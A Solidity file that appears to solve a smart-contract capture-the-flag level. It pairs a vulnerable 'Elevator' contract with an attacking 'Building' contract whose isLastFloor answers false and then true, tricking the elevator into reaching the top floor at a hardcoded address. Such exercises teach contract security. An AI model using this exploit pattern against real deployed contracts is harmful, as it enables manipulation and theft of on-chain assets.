// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Building {
    Elevator public el = Elevator(0x771F72B543CfE8D2E49672B09B065dB308f656ae); 
    bool public switchFlipped =  false; 
    
    function hack() public {
        el.goTo(1);
    }
    
    function isLastFloor(uint) external returns (bool) {
        // first call
      if (! switchFlipped) {
        switchFlipped = true;
        return false;
        // second call
      } else {
        switchFlipped = false;
        return true;
      }
    }
}